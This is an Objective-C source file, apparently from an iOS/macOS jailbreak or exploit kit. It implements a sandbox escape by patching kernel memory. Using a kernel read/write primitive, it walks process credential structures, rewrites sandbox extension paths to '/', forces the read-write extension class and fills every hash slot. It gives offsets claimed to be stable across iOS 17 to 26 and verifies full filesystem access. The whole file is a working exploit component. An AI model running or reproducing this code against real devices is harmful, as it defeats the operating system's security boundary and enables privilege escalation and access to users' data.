/*
 * sandbox_escape.m — Sandbox escape via kernel memory patching
 *
 * Walk proc_ro → ucred → cr_label → sandbox → ext_set → ext_table
 * Patch extension paths to "/", rewrite class to "com.apple.app-sandbox.read-write"
 * Fill all 16 hash slots → full R+W filesystem access
 *
 * OFFSET VERIFICATION via IDA binary analysis of real iPhone14,5 kernelcaches:
 *
 *   iOS 17.0 (21A329):  kauth_cred_proc_ref @ 0xFFFF...283DF150 → proc_ro+0x20=ucred ✓
 *   iOS 17.4 (21E219):  kauth_cred_proc_ref @ 0xFFFF...0840E184 → proc_ro+0x20=ucred ✓
 *   iOS 18.0 (22A3354): kauth_cred_proc_ref @ 0xFFFF...0856EE40 → proc_ro+0x20=ucred ✓
 *   iOS 18.4 (22E240):  kauth_cred_proc_ref @ 0xFFFF...0860F3E4 → proc_ro+0x20=ucred ✓
 *   iOS 18.5 (22F76):   kauth_cred_proc_ref @ 0xFFFF...08621308 → proc_ro+0x20=ucred ✓
 *   macOS 26.2 (25C56):  kauth_cred_proc_ref @ 0xFFFFFE...7B881F0 → proc_ro+0x20=ucred ✓
 *
 *   ucred → cr_label:  0x78 (verified by KDK 26.2 struct dump)
 *   label → sandbox:   0x10 (KDK: l_perpolicy[1] = 0x8 + 8)
 *   sandbox → ext_set: 0x10 (confirmed pe_main.js + root.m)
 *   ext → data_addr:   0x40 (confirmed pe_main.js + root.m)
 *
 * All offsets are STABLE across iOS 17.0 through macOS/iOS 26.x.
 * Based on 18.3_sandbox/root.m by the original author.
 */

#import <Foundation/Foundation.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>
#include "sandbox_escape.h"
#include "kexploit/kexploit_opa334.h"
#include "kexploit/krw.h"
#include "kexploit/offsets.h"
#include "ProgressAlert.h"

extern void early_kread(uint64_t where, void *read_buf, size_t size);

#define KRW_LEN 0x20

// Verified offsets (IDA binary analysis across 6 kernelcaches)
#define OFF_PROC_PROC_RO       0x18  // proc → proc_ro (stable 17.0-26.x)
#define OFF_PROC_RO_UCRED      0x20  // proc_ro → p_ucred (verified all versions)
#define OFF_UCRED_CR_LABEL     0x78  // ucred → cr_label (KDK struct dump)
#define OFF_LABEL_SANDBOX      0x10  // label → sandbox (MAC l_perpolicy[1])
#define OFF_SANDBOX_EXT_SET    0x10  // sandbox → ext_set
#define OFF_EXT_DATA           0x40  // ext → data_addr
#define OFF_EXT_DATALEN        0x48  // ext → data_len

#ifdef __arm64e__
// XPACI X0 — strips instruction-pointer auth (used on iPhones/PAC phones)
static uint64_t __attribute((naked)) __xpaci_ia(uint64_t a) {
    asm(".long 0xDAC143E0"); // XPACI X0
    asm("ret");
}
// XPACD X0 — strips data-pointer auth (used on M1+ iPads; ucred/proc_ro are data ptrs)
static uint64_t __attribute((naked)) __xpacd_da(uint64_t a) {
    asm(".long 0xDAC147E0"); // XPACD X0
    asm("ret");
}
// Runtime dispatch: M1+ iPad uses XPACD, everything else uses XPACI
static inline uint64_t __xpaci_sbx(uint64_t a) {
    return gIsAppleSiliconIPad ? __xpacd_da(a) : __xpaci_ia(a);
}
#else
#define __xpaci_sbx(x) (x)
#endif

extern uint64_t VM_MIN_KERNEL_ADDRESS;

// S() — strip PAC then sign-extend to a full kernel address.
// On iPhone: after XPACI the upper bits may be zeroed; OR restores the canonical sign.
// On M1+ iPad: after XPACD the pointer is already canonical (0xFFFFFE...) —
//   ORing 0xFFFFFF8000000000 would corrupt it, so we skip it.
#define S(x) ({ uint64_t _v = __xpaci_sbx(x); \
    (gIsAppleSiliconIPad ? _v : ((_v >> 32) > 0xFFFF ? (_v | 0xFFFFFF8000000000ULL) : _v)); })

// K() — true if the value looks like a kernel address on this device.
// VM_MIN_KERNEL_ADDRESS is set dynamically by offsets_init():
//   iPhone:        0xFFFFFFDC00000000
//   M1/M2/M3/M4 iPad: 0xFFFFFE0000000000
#define K(x) ((x) >= VM_MIN_KERNEL_ADDRESS)

#pragma mark - Extension patching

static void patch_ext(uint64_t ext) {
    uint64_t da = early_kread64(ext + OFF_EXT_DATA);
    uint64_t dl = early_kread64(ext + OFF_EXT_DATALEN);
    if (K(da) && dl > 0) {
        uint8_t buf[KRW_LEN];
        early_kread(da, buf, KRW_LEN);
        buf[0] = '/'; buf[1] = 0;
        early_kwrite32bytes(da, buf);
    }
    uint8_t chunk[KRW_LEN];
    early_kread(ext + OFF_EXT_DATA, chunk, KRW_LEN);
    *(uint64_t*)(chunk + 0x08) = 1;
    *(uint64_t*)(chunk + 0x10) = 0xFFFFFFFFFFFFFFFFULL;
    early_kwrite32bytes(ext + OFF_EXT_DATA, chunk);
}

static int patch_chain(uint64_t hdr) {
    int n = 0;
    for (int i = 0; i < 64 && K(hdr); i++) {
        uint64_t ext = S(early_kread64(hdr + 0x8));
        if (K(ext)) { patch_ext(ext); n++; }
        uint64_t next = early_kread64(hdr);
        if (!next || !K(next)) break;
        hdr = S(next);
    }
    return n;
}

static void set_rw_class(uint64_t hdr) {
    uint64_t ext = S(early_kread64(hdr + 0x8));
    if (!K(ext)) return;
    uint64_t da = early_kread64(ext + OFF_EXT_DATA);
    if (!K(da)) return;

    const char *rw = "com.apple.app-sandbox.read-write";
    uint8_t b1[KRW_LEN], b2[KRW_LEN];
    memset(b1, 0, KRW_LEN); memset(b2, 0, KRW_LEN);
    memcpy(b1, rw, KRW_LEN);
    early_kwrite32bytes(da + 32, b1);
    early_kwrite32bytes(da + 64, b2);

    uint8_t hb[KRW_LEN];
    early_kread(hdr, hb, KRW_LEN);
    *(uint64_t*)(hb + 0x10) = da + 32;
    early_kwrite32bytes(hdr, hb);
}

#pragma mark - Main entry

int sandbox_escape(uint64_t self_proc) {

    // ── Step 1: validate self_proc ─────────────────────────────────────────────
    progress_log(@"sbx: validating self_proc pointer");
    if (!self_proc) {
        progress_fail(@"sbx: self_proc is NULL — aborting");
        return -1;
    }
    progress_ok([NSString stringWithFormat:@"sbx: self_proc = 0x%llx", self_proc]);
    progress_set(70.f);

    // ── Step 2: read proc_ro ──────────────────────────────────────────────────
    progress_log(@"sbx: reading proc → proc_ro (offset 0x18)");
    uint64_t proc_ro_raw = early_kread64(self_proc + OFF_PROC_PROC_RO);
    uint64_t proc_ro = S(proc_ro_raw);
    if (!K(proc_ro)) {
        progress_fail([NSString stringWithFormat:
            @"sbx: proc_ro invalid (raw=0x%llx stripped=0x%llx)", proc_ro_raw, proc_ro]);
        return -1;
    }
    progress_ok([NSString stringWithFormat:@"sbx: proc_ro = 0x%llx", proc_ro]);
    progress_set(72.f);

    // ── Step 3: scan proc_ro for ucred ────────────────────────────────────────
    progress_log(@"sbx: scanning proc_ro[0x10..0x40] for ucred");
    uint64_t ucred = 0;
    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
        uint64_t raw = early_kread64(proc_ro + off);
        uint64_t smr = kread_smrptr(proc_ro + off);
        uint64_t pac = S(raw);

        // SMR path
        if (K(smr)) {
            uint64_t maybe_label = S(early_kread64(smr + 0x78));
            if (K(maybe_label)) {
                uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
                if (K(maybe_sandbox)) {
                    progress_ok([NSString stringWithFormat:
                        @"sbx: ucred @ proc_ro+0x%x via SMR = 0x%llx", off, smr]);
                    ucred = smr;
                    break;
                }
            }
        }
        // PAC-stripped path
        if (!ucred && K(pac)) {
            uint64_t maybe_label = S(early_kread64(pac + 0x78));
            if (K(maybe_label)) {
                uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
                if (K(maybe_sandbox)) {
                    progress_ok([NSString stringWithFormat:
                        @"sbx: ucred @ proc_ro+0x%x via PAC = 0x%llx", off, pac]);
                    ucred = pac;
                    break;
                }
            }
        }
    }
    if (!K(ucred)) {
        progress_fail(@"sbx: ucred NOT FOUND in proc_ro — wrong offsets?");
        return -1;
    }
    progress_set(74.f);

    // ── Step 4: walk ucred → cr_label → sandbox → ext_set ────────────────────
    progress_log(@"sbx: reading ucred → cr_label (offset 0x78)");
    uint64_t label = S(early_kread64(ucred + OFF_UCRED_CR_LABEL));
    if (!K(label)) {
        progress_fail([NSString stringWithFormat:@"sbx: cr_label invalid (0x%llx)", label]);
        return -1;
    }
    progress_ok([NSString stringWithFormat:@"sbx: cr_label = 0x%llx", label]);

    progress_log(@"sbx: reading cr_label → sandbox (offset 0x10)");
    uint64_t sandbox = S(early_kread64(label + OFF_LABEL_SANDBOX));
    if (!K(sandbox)) {
        progress_fail([NSString stringWithFormat:@"sbx: sandbox ptr invalid (0x%llx)", sandbox]);
        return -1;
    }
    progress_ok([NSString stringWithFormat:@"sbx: sandbox = 0x%llx", sandbox]);

    progress_log(@"sbx: reading sandbox → ext_set (offset 0x10)");
    uint64_t ext_set = S(early_kread64(sandbox + OFF_SANDBOX_EXT_SET));
    if (!K(ext_set)) {
        progress_fail([NSString stringWithFormat:@"sbx: ext_set invalid (0x%llx)", ext_set]);
        return -1;
    }
    progress_ok([NSString stringWithFormat:@"sbx: ext_set = 0x%llx", ext_set]);
    progress_set(78.f);

    // ── Step 5: patch extension paths to "/" ──────────────────────────────────
    progress_log(@"sbx: patching all 16 ext_set hash slots — path → \"/\"");
    int patched = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t hdr = S(early_kread64(ext_set + s * 8));
        if (K(hdr)) patched += patch_chain(hdr);
    }
    if (patched > 0) {
        progress_ok([NSString stringWithFormat:@"sbx: patched %d extension path(s) → \"/\"", patched]);
    } else {
        progress_warn(@"sbx: 0 extensions patched — ext_set may be empty");
    }
    progress_set(83.f);

    // ── Step 6: rewrite extension class to read-write ─────────────────────────
    progress_log(@"sbx: rewriting extension class → com.apple.app-sandbox.read-write");
    int classed = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t hdr = S(early_kread64(ext_set + s * 8));
        if (K(hdr) && K(early_kread64(hdr + 0x10))) { set_rw_class(hdr); classed++; }
    }
    if (classed > 0) {
        progress_ok([NSString stringWithFormat:@"sbx: rewrote class on %d slot(s)", classed]);
    } else {
        progress_warn(@"sbx: 0 extension classes rewritten");
    }
    progress_set(87.f);

    // ── Step 7: fill empty hash slots ─────────────────────────────────────────
    progress_log(@"sbx: filling empty ext_set hash slots");
    uint64_t src = 0;
    for (int s = 0; s < 16 && !src; s++) {
        uint64_t h = S(early_kread64(ext_set + s * 8));
        if (K(h)) src = h;
    }
    if (src) {
        int filled = 0;
        for (int s = 0; s < 16; s++) {
            uint64_t h = early_kread64(ext_set + s * 8);
            if (!h || !K(h)) { early_kwrite64(ext_set + s * 8, src); filled++; }
        }
        progress_ok([NSString stringWithFormat:@"sbx: filled %d empty hash slot(s)", filled]);
    } else {
        progress_warn(@"sbx: no valid src slot found — skipping slot fill");
    }
    progress_set(90.f);

    // ── Step 8: verify sandbox escape ────────────────────────────────────────
    progress_log(@"sbx: verification — write test to /var/mobile/.sbx_test");
    int fd_w = open("/var/mobile/.sbx_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd_w >= 0) {
        close(fd_w);
        unlink("/var/mobile/.sbx_test");
        progress_ok(@"sbx: *** SANDBOX ESCAPED (R+W VERIFIED) ***");
        progress_set(93.f);
        return 0;
    }

    progress_fail([NSString stringWithFormat:
        @"sbx: write test FAILED (errno=%d: %s) — sandbox NOT escaped", errno, strerror(errno)]);
    progress_set(93.f);
    return -1;
}
